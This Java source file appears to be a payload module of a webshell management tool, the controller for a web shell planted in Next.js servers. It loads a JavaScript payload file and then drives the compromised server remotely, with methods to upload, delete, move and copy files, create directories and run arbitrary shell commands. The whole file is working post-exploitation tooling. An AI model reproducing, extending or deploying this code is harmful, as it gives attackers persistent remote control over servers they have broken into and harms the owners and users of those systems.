package shells.payloads.nextjs;

import core.annotation.PayloadAnnotation;
import core.imp.AbstractPayload;
import core.shell.GDatabaseResult;
import core.shell.ShellEntity;
import core.ui.component.model.DbInfo;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;

import util.Log;
import util.functions;
import util.http.ReqParameter;

@PayloadAnnotation(
        Name = "NextJsDynamicPayload"
)
public class NextJsShell extends AbstractPayload {
    private ShellEntity shell;
    private boolean isAlive;
    private String sessionId;

    public void init(ShellEntity shellContext) {
        super.init(shellContext);
        this.shell = shellContext;
    }

    /**
     * 加载payload文件，优先从源码目录加载，如果不存在则从JAR包中加载
     */
    private InputStream loadPayloadFile(String resourcePath) {
        try {
            // 首先尝试从源码目录加载
            String sourcePath = "src/main/java/shells/payloads/nextjs/" + resourcePath;
            if (Files.exists(Paths.get(sourcePath))) {
                return new FileInputStream(new File(sourcePath));
            }

            // 如果源码目录不存在，尝试从JAR包中加载
            InputStream inputStream = NextJsShell.class.getResourceAsStream(resourcePath);
            if (inputStream != null) {
                return inputStream;
            }

            // 如果都找不到，尝试使用ClassLoader加载
            inputStream = NextJsShell.class.getClassLoader().getResourceAsStream(
                    "shells/payloads/nextjs/" + resourcePath
            );
            return inputStream;
        } catch (Exception e) {
            Log.error("Failed to load payload file: " + resourcePath);
            Log.error(e);
            return null;
        }
    }

    public byte[] getPayload() {
        byte[] data = null;
        try {
            InputStream fileInputStream = loadPayloadFile("assets/payload.js");
            if (fileInputStream != null) {
                data = functions.readInputStream(fileInputStream);
                fileInputStream.close();
            } else {
                Log.error("Cannot find payload file: assets/payload.js");
            }
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    public boolean test() {
        ReqParameter parameter = new ReqParameter();
        byte[] result = null;
        try {
            result = this.evalFunc((String)null, "test", parameter);
            String codeString = new String(result);
            String trimmed = codeString.trim();

            // 检查是否是 "ok"
            if (trimmed.equals("ok")) {
                this.isAlive = true;
                return true;
            }

            // 尝试解析 JSON 格式的响应（包含 sessionId）
            if (trimmed.startsWith("{") && trimmed.contains("sessionId")) {
                try {
                    // 简单的 JSON 解析，提取 sessionId
                    int sessionIdStart = trimmed.indexOf("\"sessionId\"");
                    if (sessionIdStart != -1) {
                        int valueStart = trimmed.indexOf("\"", sessionIdStart + 11) + 1;
                        int valueEnd = trimmed.indexOf("\"", valueStart);
                        if (valueEnd != -1) {
                            String _sessionId = trimmed.substring(valueStart, valueEnd);
                            if (_sessionId != null && !_sessionId.isEmpty()) {
                                this.isAlive = true;
                                this.sessionId = _sessionId;
                                return true;
                            }
                        }
                    }
                } catch (Exception jsonEx) {
                    // JSON 解析失败，继续检查其他格式
                }
            }

            // 如果都不匹配，记录错误
            Log.error(codeString);
            return false;
        } catch (Exception e) {
            Log.error(e);
            return false;
        }
    }

    public boolean isAlive() {
        return this.isAlive;
    }

    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        byte[] result = this.evalFunc((String)null, "uploadFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "deleteFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "moveFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc((String)null, "copyFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc((String)null, "newDir", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        String[] commandArgs = functions.SplitArgs(commandStr);
        for(int i = 0; i < commandArgs.length; ++i) {
            parameter.add(String.format("arg-%d", i), this.encoding.Encoding(commandArgs[i]));
        }
        parameter.add("argsCount", String.valueOf(commandArgs.length));
        byte[] result = this.evalFunc((String)null, "execCommand", parameter);
        return this.encoding.Decoding(result);
    }

    public String[] getSupportDatabaseTypes() {
        return new String[0];
    }

    public String[] getDatabaseDrives(String databaseName) {
        return new String[0];
    }

    public String getDatabaseConnectString(DbInfo dbInfo) {
        return "";
    }

    @Override
    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        } else {
            this.getBasicsInfo();
            return functions.formatDir(this.currentDir);
        }
    }

    public GDatabaseResult execSql(DbInfo dbInfo, String execType, String execSql) {
        throw new UnsupportedOperationException("Database operations not supported in Next.js shell");
    }

    public boolean close() {
        String result = null;
        try {
            ReqParameter reqParameter = new ReqParameter();
            result = this.encoding.Decoding(this.evalFunc((String)null, "close", reqParameter));
        } catch (Exception var6) {
        } finally {
            this.isAlive = false;
        }
        if ("ok".equals(result)) {
            return true;
        } else {
            Log.error(result);
            return false;
        }
    }

    public String getWebDir() {
        return this.currentDir();
    }
}

